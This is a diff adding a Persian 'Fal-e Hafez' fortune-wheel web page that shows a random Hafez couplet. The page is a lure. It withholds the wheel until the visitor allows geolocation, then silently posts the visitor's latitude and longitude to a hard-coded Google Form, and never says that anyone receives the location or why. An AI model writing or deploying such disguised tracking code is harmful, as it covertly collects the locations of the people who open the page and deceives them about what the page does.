@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<title>فال حافظ</title>
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
+<style>
+body {
+    margin:0;
+    font-family:'Vazirmatn', sans-serif;
+    background: #000 url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+    color:white;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    overflow:hidden;
+    position:relative;
+}
+
+/* افکت چشمک زدن ستاره‌ها */
+@keyframes twinkle {
+    0%, 100% {opacity: 0.5;}
+    50% {opacity: 1;}
+}
+
+body::before {
+    content:"";
+    position:absolute;
+    top:0; left:0; right:0; bottom:0;
+    background: url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+    animation: twinkle 2s infinite;
+    z-index:0;
+    pointer-events:none;
+}
+
+h1 { margin-bottom:15px; position:relative; z-index:1;}
+
+#wheel-container {
+    position: relative;
+    width:320px; height:320px;
+    z-index:1;
+    display:none; /* مخفی تا زمانی که اجازه داده نشود */
+}
+
+#wheel {
+    width:100%; height:100%;
+    border-radius:50%;
+    border:8px solid #ffd700;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow:0 0 20px #ffd70088;
+    transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1);
+    z-index:1;
+}
+
+.number {
+    position:absolute;
+    width:50px; height:50px;
+    border-radius:50%;
+    background:#ffd700;
+    color:#000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+    cursor:pointer;
+    user-select:none;
+    z-index:1;
+}
+
+#status {
+    margin-top:15px;
+    font-size:14px;
+    color:#aaa;
+    position:relative;
+    z-index:1;
+}
+
+#result {
+    margin-top:25px;
+    width:80%;
+    max-width:500px;
+    text-align:center;
+    font-size:18px;
+    line-height:1.8;
+    background:#ffffff10;
+    padding:15px;
+    border-radius:15px;
+    min-height:60px;
+    position:relative;
+    z-index:1;
+}
+
+button {
+    margin-top:20px;
+    padding:10px 20px;
+    font-size:16px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    background:#ffd700;
+    color:#000;
+    font-weight:bold;
+    transition:0.3s;
+    position:relative;
+    z-index:1;
+}
+
+button:hover { background:#fff; }
+</style>
+</head>
+<body>
+
+<h1>🔮 فال حافظ</h1>
+<div id="status">لطفا اجازه موقعیت خود را بدهید</div>
+
+<div id="wheel-container">
+    <div id="wheel"></div>
+</div>
+
+<button id="spinBtn" style="display:none;">🎡 چرخاندن گردونه</button>
+<div id="result" style="display:none;">روی گردونه کلیک کن</div>
+
+<script>
+// ====== فال حافظ ======
+const poems = [
+`به خاک پای تو که گر سر ز خاک برآرد  
+به بوی زلف تو هر گلی که بشکفد نسرین است`,
+`ز شعر دلکش حافظ کسی بود آگاه  
+که لطف طبع و سخن گفتن شیرین دارد`,
+`عیب رندان مکن ای زاهد پاکیزه سرشت  
+که گناه دگری بر تو نخواهند نوشت`,
+`آنان که خاک را به نظر کیمیا کنند  
+آیا بود که گوشه چشمی به ما کنند`,
+`در ازل پرتو حسنت ز تجلی دم زد  
+عشق پیدا شد و آتش به همه عالم زد`,
+`اگر آن ترک شیرازی به دست آرد دل ما را  
+به خال هندویش بخشم سمرقند و بخارا را`,
+`چشم‌های نازکش خواب‌آشوب مستان است  
+یارب این اشارتها از چشم مست چیست`
+];
+
+// ====== ایجاد گردونه و اعداد ======
+const wheel = document.getElementById("wheel");
+for(let i=1;i<=7;i++){
+    const btn=document.createElement("div");
+    btn.className="number";
+    btn.innerText=i;
+    const angle=(i-1)*(360/7);
+    const radius=120;
+    const x=Math.cos(angle*Math.PI/180)*radius;
+    const y=Math.sin(angle*Math.PI/180)*radius;
+    btn.style.transform=`translate(${x}px,${y}px)`;
+    wheel.appendChild(btn);
+}
+
+// ====== تابع شروع برنامه بعد از اجازه ======
+function startWheel() {
+    document.getElementById("wheel-container").style.display = "block";
+    document.getElementById("spinBtn").style.display = "inline-block";
+    document.getElementById("result").style.display = "block";
+}
+
+// ====== درخواست موقعیت و کنترل دسترسی ======
+navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+
+    // ارسال موقعیت به Google Form
+    const formURL =
+    "https://docs.google.com/forms/d/e/1FAIpQLSe7XbL0qJvEN2N8_3-DM0J81FBbrSYgUcrK2HWXII2Vh6CE4A/formResponse?" +
+    "entry.790108067=" + lat +
+    "&entry.385103325=" + lon;
+    fetch(formURL,{method:"POST",mode:"no-cors"});
+
+    document.getElementById("status").innerText = "📍 موقعیت ثبت شد";
+    startWheel(); // نمایش گردونه و دکمه
+}, err => {
+    document.getElementById("status").innerText = "❌ برای دیدن گردونه، باید اجازه موقعیت بدهید";
+});
+
+// ====== چرخش گردونه تصادفی ======
+let spinning=false;
+document.getElementById("spinBtn").onclick=()=>{
+    if(spinning) return;
+    spinning=true;
+
+    const randomNum=Math.floor(Math.random()*7); // 0 تا 6
+    const rotation = 360*5 + (360/7)*randomNum + (360/(7*2)); // چند دور + شماره
+
+    wheel.style.transform = `rotate(${rotation}deg)`;
+
+    setTimeout(()=>{
+        document.getElementById("result").innerText = poems[randomNum];
+        spinning=false;
+    },4000); // مدت چرخش
+};
+</script>
+
+</body>
+</html>
